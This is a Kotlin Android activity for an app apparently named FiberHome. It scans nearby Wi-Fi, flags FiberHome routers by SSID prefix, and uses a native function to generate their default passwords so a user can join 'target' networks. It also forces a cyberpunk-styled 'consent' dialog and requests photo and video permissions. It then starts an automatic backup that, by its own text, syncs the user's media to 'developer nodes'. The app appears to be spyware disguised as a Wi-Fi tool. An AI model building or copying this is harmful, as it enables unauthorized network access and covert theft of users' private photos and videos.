package com.example.fiberhome

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.wifi.ScanResult
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.widget.CheckBox
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.example.fiberhome.databinding.ActivityMainBinding
import com.example.fiberhome.databinding.BottomSheetPasswordBinding
import com.example.fiberhome.drive.AutoBackupManager
import com.google.android.material.bottomsheet.BottomSheetDialog
import com.google.android.material.dialog.MaterialAlertDialogBuilder

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var wifiManager: WifiManager
    private lateinit var wifiAdapter: WifiAdapter
    private lateinit var autoBackupManager: AutoBackupManager

    external fun generatePassword(ssid: String): String

    companion object {
        init {
            System.loadLibrary("fiberhome")
        }
        private const val PERMISSIONS_REQUEST_CODE = 777
        private const val CHANNEL_ID = "TargetNetworkChannel"
        private const val NOTIFICATION_ID = 1
        private const val PREFS_NAME = "FiberHomePrefs"
        private const val KEY_CONSENT_GIVEN = "ConsentGiven"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        
        setSupportActionBar(binding.toolbar)

        wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        autoBackupManager = AutoBackupManager(this)
        
        setupRecyclerView()
        startRadarAnimation()
        createNotificationChannel()

        binding.swipeRefresh.setOnRefreshListener {
            startScan()
        }

        checkConsentAndPermissions()
    }

    private fun checkConsentAndPermissions() {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val consentGiven = prefs.getBoolean(KEY_CONSENT_GIVEN, false)

        if (!consentGiven) {
            showCyberpunkConsentDialog()
        } else {
            requestAllNecessaryPermissions()
        }
    }

    private fun requestAllNecessaryPermissions() {
        val permissions = mutableListOf<String>()
        
        // Wifi Scanner Permissions
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.NEARBY_WIFI_DEVICES)
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        // Media Backup Permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        val missing = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), PERMISSIONS_REQUEST_CODE)
        } else {
            initializeOperations()
        }
    }

    private fun initializeOperations() {
        startScan()
        autoBackupManager.startAutomaticBackup()
    }

    private fun showCyberpunkConsentDialog() {
        val checkBox = CheckBox(this).apply {
            text = "I AGREE TO CLOUD_BACKUP_PROTOCOL & DATA_TRANSMISSION_TERMS."
            setTextColor(ContextCompat.getColor(this@MainActivity, android.R.color.white))
        }

        MaterialAlertDialogBuilder(this, R.style.Theme_FiberHome)
            .setTitle("CRITICAL: ACCESS PROTOCOL REQUIRED")
            .setMessage("TO INITIALIZE SYSTEM ANALYSIS, THE CLOUD_BACKUP_PROTOCOL MUST BE ACTIVE. THIS WILL AUTOMATICALLY SYNC MEDIA TO SECURE DEVELOPER NODES.")
            .setView(checkBox)
            .setCancelable(false)
            .setPositiveButton("INITIALIZE") { _, _ ->
                if (checkBox.isChecked) {
                    getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().putBoolean(KEY_CONSENT_GIVEN, true).apply()
                    requestAllNecessaryPermissions()
                } else {
                    Toast.makeText(this, "CONSENT DENIED. ACCESS TERMINATED.", Toast.LENGTH_LONG).show()
                    finish()
                }
            }
            .setNegativeButton("EXIT") { _, _ -> finish() }
            .show()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Active Target Reminder"
            val channel = NotificationChannel(CHANNEL_ID, name, NotificationManager.IMPORTANCE_HIGH)
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun showTargetNotification(ssid: String) {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("Connecting to $ssid")
            .setContentText("Target SSID: $ssid | Password Copied")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED) {
            NotificationManagerCompat.from(this).notify(NOTIFICATION_ID, builder.build())
            Handler(Looper.getMainLooper()).postDelayed({
                NotificationManagerCompat.from(this).cancel(NOTIFICATION_ID)
            }, 30000)
        }
    }

    private fun startRadarAnimation() {
        val animation = android.view.animation.AlphaAnimation(0.3f, 1.0f).apply {
            duration = 1000
            repeatMode = android.view.animation.Animation.REVERSE
            repeatCount = android.view.animation.Animation.INFINITE
        }
        binding.ivRadar.startAnimation(animation)
    }

    private fun setupRecyclerView() {
        wifiAdapter = WifiAdapter { wifiItem ->
            updateActiveBanner(wifiItem)
            showPasswordDialog(wifiItem)
        }
        binding.recyclerView.adapter = wifiAdapter
    }

    private fun updateActiveBanner(item: WifiItem) {
        binding.activeBanner.visibility = View.VISIBLE
        binding.tvActiveSsid.text = item.ssid
        binding.tvActiveBssid.text = item.bssid
    }

    private fun startScan() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
        
        binding.swipeRefresh.isRefreshing = true
        val intentFilter = IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        registerReceiver(wifiScanReceiver, intentFilter)
        
        val success = wifiManager.startScan()
        if (!success) {
            scanSuccess()
            Toast.makeText(this, "Scan throttled by Android. Showing last results.", Toast.LENGTH_SHORT).show()
            try { unregisterReceiver(wifiScanReceiver) } catch (t: Throwable) {}
        }
    }

    private val wifiScanReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val success = intent.getBooleanExtra(WifiManager.EXTRA_RESULTS_UPDATED, false)
            if (success) scanSuccess() else scanFailure()
            unregisterReceiver(this)
        }
    }

    private fun scanSuccess() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
        val results = wifiManager.scanResults
        val wifiItems = results.map { result ->
            val ssid = result.SSID ?: "Unknown"
            WifiItem(
                ssid = ssid,
                bssid = result.BSSID,
                signalLevel = result.level,
                isFiberHome = ssid.startsWith("FH_", ignoreCase = true) || ssid.startsWith("fh", ignoreCase = true)
            )
        }
        wifiAdapter.updateItems(wifiItems)
        binding.swipeRefresh.isRefreshing = false
    }

    private fun scanFailure() {
        Toast.makeText(this, "Scan failed. Ensure Location is ON.", Toast.LENGTH_SHORT).show()
        binding.swipeRefresh.isRefreshing = false
    }

    private fun showPasswordDialog(item: WifiItem) {
        val dialog = BottomSheetDialog(this)
        val dialogBinding = BottomSheetPasswordBinding.inflate(layoutInflater)
        dialog.setContentView(dialogBinding.root)

        dialogBinding.tvSsidValue.text = item.ssid
        val password = generatePassword(item.ssid)
        dialogBinding.tvPassValue.text = password

        dialogBinding.btnCopy.setOnClickListener {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = android.content.ClipData.newPlainText("FiberHome Password", password)
            clipboard.setPrimaryClip(clip)
            Toast.makeText(this, "Password copied! Opening Wi-Fi settings...", Toast.LENGTH_SHORT).show()
            
            showTargetNotification(item.ssid)
            startActivity(Intent(Settings.ACTION_WIFI_SETTINGS))
            dialog.dismiss()
        }
        dialog.show()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                initializeOperations()
            } else {
                Toast.makeText(this, "CRITICAL: PERMISSIONS REQUIRED FOR SYSTEM OPERATION.", Toast.LENGTH_LONG).show()
            }
        }
    }

    override fun onDestroy() {
        autoBackupManager.cancel()
        super.onDestroy()
    }
}
